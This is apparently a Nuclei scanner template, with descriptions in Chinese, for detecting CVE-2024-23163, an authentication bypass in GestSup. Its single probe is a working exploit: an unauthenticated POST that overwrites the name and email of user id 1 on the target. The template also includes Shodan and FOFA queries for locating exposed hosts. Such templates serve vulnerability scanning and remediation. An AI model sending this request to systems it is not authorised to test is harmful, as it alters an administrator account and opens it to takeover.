id: gestsup-account-takeover

info:
  name: GestSup - 漏洞（CVE-2024-23163）
  author: eeche,chae1xx1os,persona-twotwo,soonghee2,gy741
  severity: critical
  description: |
    该模板用于检测 GestSup - 漏洞（CVE-2024-23163）。该类漏洞通常源于认证、授权或流程校验不足，使攻击者无需合法权限即可访问敏感功能。模板主要向 `/ajax/ticket_user_db.php` 等路径发送探测请求，并根据响应中的 `{"status":"success`、`text/html` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可绕过身份认证或未授权访问敏感接口，获取管理功能、重置密码或操作业务数据。
    - 若接口涉及账号、配置或文件操作，可能造成权限提升、数据泄露和业务被篡改。
  remediation: |
    - 修复认证与授权校验逻辑，确保每个敏感接口都执行服务端权限判断。
    - 升级受影响版本，并限制管理接口仅允许可信来源访问。
    - 复核近期账号变更、密码重置、配置修改和异常访问记录。
  reference:
    - https://www.synacktiv.com/advisories/multiple-vulnerabilities-on-gestsup-3244
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-23163
    - https://doc.gestsup.fr/install/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    cpe: cpe:2.3:a:gestsup:gestsup:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: gestsup
    fofa-query: title="GestSup"
    shodan-query: http.favicon.hash:-283003760
    product: gestsup
  tags: account-takeover,gestsup,vuln

variables:
  email: "{{randstr}}@{{rand_base(5)}}.com"
  firstname: "{{rand_base(5)}}"
  lastname: "{{rand_base(5)}}"

http:
  - raw:
      - |
        POST /ajax/ticket_user_db.php HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: xmlhttprequest
        Content-Type: application/x-www-form-urlencoded

        modifyuser=1&lastname={{lastname}}&firstname={{firstname}}&phone=&mobile=&mail={{email}}&company=111&id=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"status":"success'
          - 'firstname":"{{firstname}}","lastname":"{{lastname}}'
        condition: and

      - type: word
        part: header
        words:
          - 'text/html'

    extractors:
      - type: dsl
        dsl:
          - '"Firstname: "+ firstname'
          - '"Lastname: "+ lastname'
